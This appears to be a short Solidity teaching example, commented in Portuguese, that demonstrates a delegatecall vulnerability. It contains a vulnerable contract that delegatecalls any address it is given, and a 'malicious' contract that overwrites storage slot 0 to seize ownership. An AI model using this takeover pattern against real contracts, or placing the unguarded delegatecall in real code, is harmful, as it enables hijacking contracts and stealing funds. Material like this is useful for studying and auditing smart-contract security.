// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract MaliciousLogic {
    function setOwner() public {
        // O ataque: alterar o slot 0 do storage do contrato que fez o delegatecall
        assembly {
            sstore(0, caller())
        }
    }
}

contract VulnerableDelegate {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function execute(address _target) public {
        (bool success, ) = _target.delegatecall(
            abi.encodeWithSignature("setOwner()")
        );
        require(success, "Delegatecall failed");
    }
}